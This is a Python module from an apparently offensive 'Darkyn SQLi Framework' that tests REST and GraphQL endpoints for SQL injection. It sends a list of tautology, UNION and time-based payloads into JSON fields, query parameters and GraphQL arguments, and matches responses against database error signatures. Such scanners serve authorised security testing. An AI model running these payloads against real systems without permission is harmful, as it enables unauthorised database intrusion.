"""
darkyn/attack/api_tester.py
GraphQL & REST API SQLi Tester — Darkyn SQLi Framework v2.0

Fitur:
- GraphQL injection (query introspection, field injection)
- REST API injection (JSON body, query param, path param)
- JSON-based input handling
- Respons parser untuk API modern (JSON, wrapped response)
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any, Optional

from darkyn.core.request_engine import RequestEngine


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class APIFinding:
    """Temuan SQLi pada endpoint API."""

    endpoint: str
    method: str                     # GET / POST / GRAPHQL
    injection_point: str            # field/param yang vulnerable
    payload: str
    response_indicator: str         # tanda SQLi di response
    confidence: float               # 0.0 – 1.0
    raw_response_snippet: str = ""


@dataclass
class APITestResult:
    """Hasil test satu endpoint."""

    endpoint: str
    endpoint_type: str              # REST / GraphQL
    tested: int = 0
    findings: list[APIFinding] = field(default_factory=list)

    @property
    def vulnerable(self) -> bool:
        return bool(self.findings)


# ---------------------------------------------------------------------------
# SQL error signatures
# ---------------------------------------------------------------------------

SQL_ERROR_PATTERNS: list[str] = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "supplied argument is not a valid mysql",
    "unclosed quotation mark",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "postgresql error",
    "unterminated quoted string",
    "syntax error at or near",
    # MSSQL
    "microsoft ole db provider for sql server",
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "microsoft sql native client",
    # Oracle
    "ora-01756",
    "ora-00933",
    "ora-00907",
    "oracle error",
    # SQLite
    "sqlite error",
    "sqlite3.operationalerror",
    "no such column",
    # Generic
    "sql syntax",
    "syntax error",
    "database error",
    "db error",
    "invalid query",
    "sql command not properly ended",
]

# Payloads khusus API (tidak mengandung karakter berbahaya untuk sistem)
API_SQLI_PAYLOADS: list[str] = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' AND '1'='2",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; SELECT SLEEP(1)--",
    "1; WAITFOR DELAY '0:0:1'--",
    "' AND SLEEP(1)--",
    "' AND 1=CONVERT(int,'a')--",
    "\\",
    "%27",
    "''",
]


# ---------------------------------------------------------------------------
# REST API Tester
# ---------------------------------------------------------------------------

class RESTApiTester:
    """
    Test SQLi pada REST API endpoint.

    Mendukung:
    - JSON body injection (POST/PUT/PATCH)
    - Query parameter injection (GET)
    - Path parameter injection
    - Header injection

    Args:
        engine: RequestEngine instance.
        verbose: Print progress.
    """

    def __init__(self, engine: RequestEngine, verbose: bool = False) -> None:
        self.engine = engine
        self.verbose = verbose

    def test_json_body(
        self,
        url: str,
        template: dict[str, Any],
        method: str = "POST",
    ) -> APITestResult:
        """
        Inject payload ke setiap field dalam JSON body.

        Args:
            url: Endpoint URL.
            template: JSON body template, e.g. {"username": "test", "password": "test"}
            method: HTTP method (POST/PUT/PATCH).

        Returns:
            APITestResult dengan findings.
        """
        result = APITestResult(endpoint=url, endpoint_type="REST")

        for field_name in template:
            original_value = template[field_name]

            for payload in API_SQLI_PAYLOADS:
                injected = dict(template)
                injected[field_name] = payload

                try:
                    resp = self.engine.request(
                        method,
                        url,
                        json=injected,
                        headers={"Content-Type": "application/json"},
                    )
                    result.tested += 1

                    finding = self._analyze_response(
                        resp, url, method, field_name, payload
                    )
                    if finding:
                        result.findings.append(finding)
                        if self.verbose:
                            print(f"[!] SQLi found: {url} → {field_name} with {payload!r}")

                except Exception as exc:
                    if self.verbose:
                        print(f"[-] Request error: {exc}")

        return result

    def test_query_params(
        self,
        url: str,
        params: dict[str, str],
    ) -> APITestResult:
        """
        Inject payload ke query parameters.

        Args:
            url: Base URL.
            params: Query params dict, e.g. {"id": "1", "search": "test"}
        """
        result = APITestResult(endpoint=url, endpoint_type="REST")

        for param_name in params:
            for payload in API_SQLI_PAYLOADS:
                injected = dict(params)
                injected[param_name] = payload

                try:
                    resp = self.engine.get(url, params=injected)
                    result.tested += 1

                    finding = self._analyze_response(
                        resp, url, "GET", param_name, payload
                    )
                    if finding:
                        result.findings.append(finding)

                except Exception as exc:
                    if self.verbose:
                        print(f"[-] Request error: {exc}")

        return result

    # ------------------------------------------------------------------

    def _analyze_response(
        self,
        resp,
        url: str,
        method: str,
        injection_point: str,
        payload: str,
    ) -> Optional[APIFinding]:
        """
        Analisis response untuk tanda SQLi.
        Mendukung JSON response, HTML response, dan wrapped modern frontend.
        """
        body = resp.text.lower()
        content_type = resp.headers.get("Content-Type", "").lower()

        # Coba parse JSON
        json_body = None
        if "application/json" in content_type:
            try:
                json_body = resp.json()
            except Exception:
                pass

        # Cari SQL error signature di body mentah
        for pattern in SQL_ERROR_PATTERNS:
            if pattern in body:
                snippet = self._extract_snippet(resp.text, pattern)
                return APIFinding(
                    endpoint=url,
                    method=method,
                    injection_point=injection_point,
                    payload=payload,
                    response_indicator=f"SQL error pattern: '{pattern}'",
                    confidence=0.9,
                    raw_response_snippet=snippet,
                )

        # Analisis JSON response — cari error message di nested field
        if json_body:
            error_text = self._extract_json_error(json_body)
            if error_text:
                for pattern in SQL_ERROR_PATTERNS:
                    if pattern in error_text.lower():
                        return APIFinding(
                            endpoint=url,
                            method=method,
                            injection_point=injection_point,
                            payload=payload,
                            response_indicator=f"SQL error in JSON field: '{pattern}'",
                            confidence=0.85,
                            raw_response_snippet=error_text[:300],
                        )

        # Analisis status code anomaly
        if resp.status_code == 500 and "'" in payload:
            return APIFinding(
                endpoint=url,
                method=method,
                injection_point=injection_point,
                payload=payload,
                response_indicator="HTTP 500 triggered by quote character",
                confidence=0.5,
                raw_response_snippet=resp.text[:200],
            )

        return None

    def _extract_snippet(self, text: str, pattern: str, context: int = 150) -> str:
        """Ekstrak snippet teks di sekitar pattern."""
        idx = text.lower().find(pattern)
        if idx == -1:
            return text[:200]
        start = max(0, idx - context // 2)
        end = min(len(text), idx + len(pattern) + context // 2)
        return text[start:end]

    def _extract_json_error(self, obj: Any, depth: int = 0) -> str:
        """
        Rekursif cari field error/message/detail di JSON response.
        Handles wrapped responses: { "data": { "error": "..." } }
        """
        if depth > 5:
            return ""

        if isinstance(obj, str):
            return obj

        if isinstance(obj, dict):
            for key in ["error", "message", "detail", "msg", "description",
                        "errors", "exception", "stacktrace", "trace"]:
                if key in obj:
                    return self._extract_json_error(obj[key], depth + 1)
            # Fallback: cek semua value
            for v in obj.values():
                result = self._extract_json_error(v, depth + 1)
                if result:
                    return result

        if isinstance(obj, list):
            for item in obj:
                result = self._extract_json_error(item, depth + 1)
                if result:
                    return result

        return ""


# ---------------------------------------------------------------------------
# GraphQL Tester
# ---------------------------------------------------------------------------

class GraphQLTester:
    """
    Test SQLi pada GraphQL endpoint.

    Strategi:
    1. Introspection — cek apakah introspection aktif (info leak)
    2. Field injection — inject payload ke setiap string argument
    3. Query depth attack — nested query untuk analisis response

    Args:
        engine: RequestEngine instance.
        verbose: Print progress.
    """

    INTROSPECTION_QUERY = """
    {
      __schema {
        queryType { name }
        types { name kind fields { name type { name kind } } }
      }
    }
    """

    def __init__(self, engine: RequestEngine, verbose: bool = False) -> None:
        self.engine = engine
        self.verbose = verbose
        self._rest_tester = RESTApiTester(engine, verbose)

    def test(self, endpoint: str, queries: Optional[list[dict]] = None) -> APITestResult:
        """
        Jalankan full GraphQL SQLi test.

        Args:
            endpoint: GraphQL endpoint URL (e.g. /graphql, /api/graphql)
            queries: List query dict dengan format:
                     [{"query": "{ user(id: INJECT) { name } }", "inject_marker": "INJECT"}]
                     Jika None, pakai query template default.

        Returns:
            APITestResult dengan findings.
        """
        result = APITestResult(endpoint=endpoint, endpoint_type="GraphQL")

        # Step 1: Cek introspection
        intro_result = self._check_introspection(endpoint)
        if intro_result:
            result.findings.append(intro_result)

        # Step 2: Inject ke query arguments
        if queries is None:
            queries = self._default_queries()

        for q in queries:
            marker = q.get("inject_marker", "INJECT")
            base_query = q.get("query", "")

            for payload in API_SQLI_PAYLOADS[:8]:  # subset payload untuk GraphQL
                injected_query = base_query.replace(marker, payload.replace('"', '\\"'))
                body = {"query": injected_query}

                try:
                    resp = self.engine.post(
                        endpoint,
                        json=body,
                        headers={"Content-Type": "application/json"},
                    )
                    result.tested += 1

                    finding = self._rest_tester._analyze_response(
                        resp, endpoint, "GRAPHQL", f"query_arg({marker})", payload
                    )
                    if finding:
                        result.findings.append(finding)

                except Exception as exc:
                    if self.verbose:
                        print(f"[-] GraphQL request error: {exc}")

        return result

    def _check_introspection(self, endpoint: str) -> Optional[APIFinding]:
        """Cek apakah GraphQL introspection aktif (information disclosure)."""
        try:
            resp = self.engine.post(
                endpoint,
                json={"query": self.INTROSPECTION_QUERY},
                headers={"Content-Type": "application/json"},
            )

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if "__schema" in str(data):
                        return APIFinding(
                            endpoint=endpoint,
                            method="GRAPHQL",
                            injection_point="introspection",
                            payload=self.INTROSPECTION_QUERY.strip(),
                            response_indicator="Introspection enabled — schema exposed",
                            confidence=1.0,
                            raw_response_snippet=resp.text[:500],
                        )
                except Exception:
                    pass
        except Exception:
            pass
        return None

    def _default_queries(self) -> list[dict]:
        """Query template default untuk test umum."""
        return [
            {
                "query": '{ user(id: "INJECT") { id name email } }',
                "inject_marker": "INJECT",
            },
            {
                "query": '{ search(query: "INJECT") { results { id title } } }',
                "inject_marker": "INJECT",
            },
            {
                "query": '{ login(username: "INJECT", password: "test") { token } }',
                "inject_marker": "INJECT",
            },
            {
                "query": '{ product(name: "INJECT") { id price } }',
                "inject_marker": "INJECT",
            },
        ]
